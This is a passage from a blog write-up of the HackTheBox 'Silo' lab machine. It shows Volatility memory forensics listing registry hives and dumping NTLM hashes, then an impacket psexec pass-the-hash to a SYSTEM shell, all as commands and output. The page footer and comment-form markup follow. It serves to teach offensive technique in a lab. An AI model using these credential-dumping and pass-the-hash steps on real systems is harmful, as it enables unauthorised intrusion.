+<span class="go">└──╼ $volatility kdbgscan -f ~/Documents/htb/boxes/silo/SILO-20180105-221806.dmp</span>
+<span class="go">&lt;SNIP     &gt;&lt;SNIP&gt;</span>
+
+<span class="go">**************************************************</span>
+<span class="go">**************************************************                                                                    </span>
+<span class="go">Instantiating KDBG using: Unnamed AS Win2012R2x64_18340 (6.3.9601 64bit)                                              </span>
+<span class="go">Offset (V)                    : 0xf80078520a30                                                                        </span>
+<span class="go">Offset (P)                    : 0x2320a30                                                                             </span>
+<span class="go">KdCopyDataBlock (V)           : 0xf8007845f9b0                                                                        </span>
+<span class="go">Block encoded                 : Yes                       </span>
+<span class="go">Wait never                    : 0xd08e8400bd4a143a        </span>
+<span class="go">Wait always                   : 0x17a949efd11db80                                                                                                                                                                                           </span>
+<span class="go">KDBG owner tag check          : True                       </span>
+<span class="go">Profile suggestion (KDBGHeader): Win2012R2x64_18340                                                                                                                                                                                         </span>
+<span class="go">Version64                     : 0xf80078520d90 (Major: 15, Minor: 9600)                                               </span>
+<span class="go">Service Pack (CmNtCSDVersion) : 0                                                                                                                                                                                                           </span>
+<span class="go">Build string (NtBuildLab)     : 9600.16384.amd64fre.winblue_rtm.                                                      </span>
+<span class="go">PsActiveProcessHead           : 0xfffff80078537700 (51 processes)                                                                                                                                                                           </span>
+<span class="go">PsLoadedModuleList            : 0xfffff800785519b0 (148 modules)                                                      </span>
+<span class="go">KernelBase                    : 0xfffff8007828a000 (Matches MZ: True)                                                                                                                                                                       </span>
+<span class="go">Major (OptionalHeader)        : 6                                                                                     </span>
+<span class="go">Minor (OptionalHeader)        : 3                         </span>
+<span class="go">KPCR                          : 0xfffff8007857b000 (CPU 0)</span>
+<span class="go">KPCR                          : 0xffffd000207e8000 (CPU 1)  </span>
+<span class="go">&lt;SNIP     &gt;&lt;SNIP&gt;</span>
+</pre></div>
+
+
+<p>Since the output is very long I only pasted here a snippet. The bit I pasted is repeated several times but with different profiles. I only pasted the one that is relevant to the victim OS version I had found before:</p>
+<div class="highlight"><pre><span></span><span class="go">meterpreter &gt; sysinfo</span>
+<span class="go">Computer        : SILO</span>
+<span class="go">OS              : Windows 2012 R2 (6.3 Build 9600).</span>
+<span class="go">Architecture    : x64</span>
+<span class="go">System Language : en_GB</span>
+<span class="go">Domain          : HTB</span>
+<span class="go">Logged On Users : 0</span>
+<span class="go">Meterpreter     : x64/windows</span>
+</pre></div>
+
+
+<p>So now I run volatility again using the Win 2012 profile:</p>
+<div class="highlight"><pre><span></span><span class="go">┌─[m4rc0@SittingDucks]─[~]</span>
+<span class="go">└──╼ $volatility -f ~/Documents/htb/boxes/silo/SILO-20180105-221806.dmp --profile Win2012R2x64 hivelist</span>
+<span class="go">Volatility Foundation Volatility Framework 2.6</span>
+<span class="go">Virtual            Physical           Name</span>
+<span class="go">------------------ ------------------ ----</span>
+<span class="go">0xffffc0000100a000 0x000000000d40e000 \??\C:\Users\Administrator\AppData\Local\Microsoft\Windows\UsrClass.dat</span>
+<span class="go">0xffffc000011fb000 0x0000000034570000 \SystemRoot\System32\config\DRIVERS</span>
+<span class="go">0xffffc00001600000 0x000000003327b000 \??\C:\Windows\AppCompat\Programs\Amcache.hve</span>
+<span class="go">0xffffc0000001e000 0x0000000000b65000 [no name]</span>
+<span class="go">0xffffc00000028000 0x0000000000a70000 \REGISTRY\MACHINE\SYSTEM</span>
+<span class="go">0xffffc00000052000 0x000000001a25b000 \REGISTRY\MACHINE\HARDWARE</span>
+<span class="go">0xffffc000004de000 0x0000000024cf8000 \Device\HarddiskVolume1\Boot\BCD</span>
+<span class="go">0xffffc00000103000 0x000000003205d000 \SystemRoot\System32\Config\SOFTWARE</span>
+<span class="go">0xffffc00002c43000 0x0000000028ecb000 \SystemRoot\System32\Config\DEFAULT</span>
+<span class="go">0xffffc000061a3000 0x0000000027532000 \SystemRoot\System32\Config\SECURITY</span>
+<span class="go">0xffffc00000619000 0x0000000026cc5000 \SystemRoot\System32\Config\SAM</span>
+<span class="go">0xffffc0000060d000 0x0000000026c93000 \??\C:\Windows\ServiceProfiles\NetworkService\NTUSER.DAT</span>
+<span class="go">0xffffc000006cf000 0x000000002688f000 \SystemRoot\System32\Config\BBI</span>
+<span class="go">0xffffc000007e7000 0x00000000259a8000 \??\C:\Windows\ServiceProfiles\LocalService\NTUSER.DAT</span>
+<span class="go">0xffffc00000fed000 0x000000000d67f000 \??\C:\Users\Administrator\ntuser.dat</span>
+</pre></div>
+
+
+<p><code>Volatility</code> has many useful <a href="https://github.com/volatilityfoundation/volatility/wiki/Command-Reference#hivelist">options</a>. In this scenario I used <code>hivelist</code> to get a list of the registry hives in the memory dump.</p>
+<p>Once we have the hives, we can try to retrieve the administrator password hash. For this we can use the <code>hashdump</code> fuction of <code>volatility</code>. The help menu of volatility hashdump shows this:</p>
+<div class="highlight"><pre><span></span><span class="go">  -y SYS_OFFSET, --sys-offset=SYS_OFFSET</span>
+<span class="go">                        SYSTEM hive offset (virtual)</span>
+<span class="go">  -s SAM_OFFSET, --sam-offset=SAM_OFFSET</span>
+<span class="go">                        SAM hive offset (virtual)</span>
+</pre></div>
+
+
+<p>So since we have the SYS and SAM offsets from the previous command we can now try to fetch the administrator hash:</p>
+<div class="highlight"><pre><span></span><span class="go">┌─[m4rc0@SittingDucks]─[~]</span>
+<span class="go">└──╼ $volatility -f ~/Documents/htb/boxes/silo/SILO-20180105-221806.dmp --profile Win2012R2x64 hashdump -y 0xffffc00000028000 -s 0xffffc00000619000</span>
+<span class="go">Volatility Foundation Volatility Framework 2.6</span>
+<span class="go">Administrator:500:aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7:::</span>
+<span class="go">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span>
+<span class="go">Phineas:1002:aad3b435b51404eeaad3b435b51404ee:8eacdd67b77749e65d3b3d5c110b0969:::</span>
+</pre></div>
+
+
+<p>Now I can use a python script, <a href="https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/psexec.py">psexec.py</a> to perform a pass-the-hash attack.</p>
+<div class="highlight"><pre><span></span><span class="go">┌─[m4rc0@SittingDucks]─[~/Tools/impacket/examples]</span>
+<span class="go">└──╼ $./psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7 -target-ip 10.10.10.82 administrator@10.10.10.82</span>
+<span class="go">Impacket v0.9.22.dev1+20200327.103853.7e505892 - Copyright 2020 SecureAuth Corporation</span>
+
+<span class="go">[*] Requesting shares on 10.10.10.82.....</span>
+<span class="go">[*] Found writable share ADMIN$</span>
+<span class="go">[*] Uploading file OuXukLXP.exe</span>
+<span class="go">[*] Opening SVCManager on 10.10.10.82.....</span>
+<span class="go">[*] Creating service kdqo on 10.10.10.82.....</span>
+<span class="go">[*] Starting service kdqo.....</span>
+<span class="go">[!] Press help for extra shell commands</span>
+<span class="go">Microsoft Windows [Version 6.3.9600]</span>
+<span class="gp gp-VirtualEnv">(c)</span> <span class="go">2013 Microsoft Corporation. All rights reserved.</span>
+
+<span class="go">C:\Windows\system32&gt;whoami</span>
+<span class="go">nt authority\system</span>
+</pre></div>
+
+
+<p>Finally, I have full provileges and can read the <code>root.txt</code>. </p>
+<div class="highlight"><pre><span></span><span class="go">C:\Windows\system32&gt;type c:\users\administrator\desktop\root.txt</span>
+<span class="go">cd****************************f6</span>
+</pre></div>
+
+
+<p>PS: I could have easily downloaded or read directly the user.txt and root.txt using <code>odat</code> since we had privileges to do that. However, I used the long way for learning purposes and I have to say it was a nice box with few difficulties. I struggled quite a lot on the special character thing, but in the end is a lesson learned. </p>
+			<style>
+#pcs-comment-form input,
+#pcs-comment-form textarea {
+	width: 100%;
+}
+#pcs-comment-form-display-replyto {
+	border: solid 1px black;
+	padding: 2px;
+}
+#pcs-comment-form-display-replyto p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+#pcs-comments ul {
+	list-style: none;
+}
+#pcs-comments .comment-left {
+	display: table-cell;
+	padding-right: 10px;
+}
+#pcs-comments .comment-body {
+	display: table-cell;
+	vertical-align: top;
+	width: 100%;
+}
+</style>
+
+	<section id="pcs-comments">
+	<header>
+		<h2>Comments</h2>
+		<hr/>
+	</header>
+		<p>There are no comments yet.</p>
+	<section>
+	<form id="pcs-comment-form" action="#">
+		<legend>Add a Comment</legend>
+		<input type="hidden" id="pcs-comment-form-input-replyto">
+		<fieldset>
+			<label for="pcs-comment-form-input-name">Name</label>
+			<input  id="pcs-comment-form-input-name" type="text" placeholder="Enter your name or nickname" />
+		</fieldset>
+		<fieldset>
+			<label for="pcs-comment-form-input-website">Website</label>
+			<input  id="pcs-comment-form-input-website" type="text" placeholder="Enter your website (optional)" />
+		</fieldset>
+		<fieldset>
+			<label   for="pcs-comment-form-input-textarea">Your Comment</label>
+			<textarea id="pcs-comment-form-input-textarea" rows="5" style="resize:vertical;" placeholder="Your comment"></textarea>
+			<p>You can use the <a href="https://en.wikipedia.org/wiki/Markdown">Markdown</a> syntax to format your comment.</p>
+			<div style="display: none; " id="pcs-comment-form-display-replyto"></div>
+		</fieldset>
+
+		<button type="submit"
+				id="pcs-comment-form-button-submit"
+				>Post via email</button>
+
+			<a href="https://sittingducks.io/feeds/comment.Silo.atom.xml">
+				Comment Atom Feed
+			</a>
+	</form>
+</section>
+
+</section>
+
+			<script type="text/javascript" src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
+	<script type="text/javascript" src="https://sittingducks.io/theme/js/comments.js"></script>
+	<script type="text/javascript">
+		$(document).ready(function() {
+			CommentSystem.email_user   = "sittingducks.io";
+			CommentSystem.email_domain = "protonmail.com";
+			CommentSystem.display_replyto_html = function(comment_content, article_slug, author) { 
+				return ''
+					+ '<button style="float:right;" onclick="CommentSystem.cancelReply(); return false;" title="Cancel the reply">'
+					+ 	'×'
+					+ '</button>'
+					+ '<p>This comment will be posted as a reply to \'<a title="'+comment_content+'" href="#comment-'+article_slug+'">'+author+'</a>\'</p>';
+			};
+
+			$('#pcs-comment-form').on("submit",
+				function( event )
+				{
+					event.preventDefault();
+					$(location).attr('href', CommentSystem.getMailtoLink("Silo"));
+				}
+			);
+		});
+	</script>
+
+
+      </div><!-- .entry-content -->
+      <br /><br />
+      <div class="article_meta">
+        Tags:
+          <a href="https://sittingducks.io/tag/hackthebox.html">HackTheBox</a>      </div>
+    </div>
+  </div>
+</article><!-- #post-## -->
+                </div>
+              </div><!-- #main -->
+          </div><!-- #primary -->
+        </div>
+      </div><!-- close .row -->
+    </div><!-- close .container -->
+  </div><!-- close .site-content -->
+
+
+
+
+  <div id="footer-area">
+    <footer id="colophon" class="site-footer" role="contentinfo">
+      <div class="site-info container">
+        <div class="row">
+                    <div class="copyright col-md-12">
+                    <a href="https://sittingducks.io/pages/privacy-policy">Privacy Policy</a> | 
+                    <a href="https://sittingducks.io/feeds/all.atom.xml">Atom Feed</a> | 
+                    <a href="https://sittingducks.io/sitemap.xml">Sitemap</a><br />
+                    &copy; 2019 <a href="https://sittingducks.io">Marco Meli</a> </div>
+        </div>
+      </div><!-- .site-info -->
+      <div class="scroll-to-top" style="display: none;"><i class="fa fa-angle-up"></i></div><!-- .scroll-to-top -->
+    </footer><!-- #colophon -->
+  </div>
+
+  <script type="text/javascript">
+    window.addEventListener('load', function(){
+    if (window.location.pathname != '/' && window.location.pathname != '/index.html'){
+      window.scroll(0, document.getElementById('main').offsetTop);
+    }})
+  </script>
+
+  
+ <!-- <script src="https://sittingducks.io/theme/js/jquery.min.js"></script> -->
+	<!-- Make sure jquery is loaded first, then load colorbox -->
+  <script src="https://sittingducks.io/theme/js/jquery.colorbox-min.js"></script>
+  <script src="https://sittingducks.io/theme/js/load-colorbox.js"></script>
+
+
+  
+  
+</body>
+</html>
